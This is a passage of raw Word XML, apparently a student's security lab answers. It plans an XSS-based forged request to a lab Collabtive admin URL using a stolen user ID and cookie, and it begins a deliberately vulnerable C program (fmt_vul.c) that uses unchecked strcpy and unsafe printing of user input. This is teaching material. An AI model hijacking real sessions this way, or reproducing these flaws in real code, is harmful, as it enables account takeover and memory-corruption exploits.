        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:r w:rsidR="00D75B41">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">id information </w:t>
      </w:r>
      <w:r w:rsidR="00083ABC">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">was obtained from </w:t>
      </w:r>
      <w:r w:rsidR="00D75B41">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>the “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D75B41">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>MyAccount</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D75B41">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Link</w:t>
      </w:r>
      <w:r w:rsidR="00083ABC">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">” </w:t>
      </w:r>
      <w:r w:rsidR="00D75B41">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00D75B41">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>getElementsByClassName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D75B41">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00D75B41">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">“active”)[0]) </w:t>
      </w:r>
      <w:r w:rsidR="00083ABC">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">in </w:t>
      </w:r>
      <w:r w:rsidR="00D75B41">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>the upper right hand corner</w:t>
      </w:r>
      <w:r w:rsidR="00083ABC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(highlighted with a </w:t>
      </w:r>
      <w:r w:rsidR="00D75B41">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>red</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> circle above</w:t>
      </w:r>
      <w:r w:rsidR="00083ABC">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the picture in 6.2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="73" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="18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6.4.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last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task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w w:val="93"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>X</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="93"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="93"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
          <w:w w:val="9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>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,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5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t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y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i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g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wri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scri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52"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a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y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pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>oj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cts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d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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di</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111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w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="118"/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to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proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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bel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w </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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pi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c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ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr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d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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 xml:space="preserve">lays </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pa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t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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>wo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4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ic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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44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obse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ved.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="1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Fr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>om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8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 xml:space="preserve">data </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
          <w:w w:val="113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3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m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pu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ou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script</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/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 xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ld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ta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>eted</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
          <w:w w:val="1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L?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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proofErr w:type="gramEnd"/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y?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A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="107"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">so, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>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0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p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>tia</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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ly</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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am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u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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se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>ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">r </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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script</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F01FA">
      <w:pPr>
        <w:spacing w:before="8" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="006769F0">
      <w:pPr>
        <w:ind w:left="1534"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_i1027" type="#_x0000_t75" style="width:382pt;height:141pt">
            <v:imagedata r:id="rId10" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F01FA">
      <w:pPr>
        <w:spacing w:before="18" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="519" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="983"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ll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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U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z w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>http://www.x</w:t>
      </w:r>
      <w:r w:rsidR="00083ABC" w:rsidRPr="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>sslabcollabtive.com/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00083ABC" w:rsidRPr="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>admin.php</w:t>
      </w:r>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>?action</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>addpro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">                                          </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10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>; Field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am</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5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z w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="004E4108" w:rsidRPr="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>project name, user ID, user’s cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="10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</w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00083ABC" w:rsidRPr="0095026F" w:rsidRDefault="00083ABC" w:rsidP="00901EA1">
      <w:pPr>
        <w:ind w:left="104" w:right="983"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00083ABC" w:rsidRPr="0095026F">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1140" w:right="740" w:bottom="280" w:left="760" w:header="0" w:footer="976" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidRPr="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>targeted URL</w:t>
      </w:r>
      <w:r w:rsidR="00D75B41" w:rsidRPr="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> “http://www.</w:t>
      </w:r>
      <w:r w:rsidR="004E4108" w:rsidRPr="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xsslabcollabtive.com/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004E4108" w:rsidRPr="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>admin.php?action</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004E4108" w:rsidRPr="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004E4108" w:rsidRPr="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>addpro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004E4108" w:rsidRPr="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">” </w:t>
      </w:r>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">above </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>should be used</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> because</w:t>
      </w:r>
      <w:r w:rsidR="00E07C8B">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> it will allow a project to be added for the stolen user ID to be added to</w:t>
      </w:r>
      <w:r w:rsidR="0095026F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>. Field names that may change between script uses would be name of the project to be created/added, user ID for the person being added to the project, and the corresponding cookie for that user ID.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="59"/>
        <w:ind w:left="104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10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ts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tal]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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Giv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proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr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oll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i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le</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="12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“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>mt_v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ul</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:w w:val="1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(f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>or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r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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ce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-27"/>
          <w:w w:val="112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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>rp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ose</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="17"/>
          <w:w w:val="112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on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="107"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>y)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="21"/>
        <w:ind w:left="10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char *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argv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[])</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="132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{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char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text[1024];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static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test_val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= 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72;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="82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position w:val="2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>strcpy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position w:val="2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">text, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>[1]);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pacing w:val="-1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"The right way to print user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controlled input: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n");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"%s", text);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:ind w:left="82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pacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>"\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nThe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wrong way to print user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-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
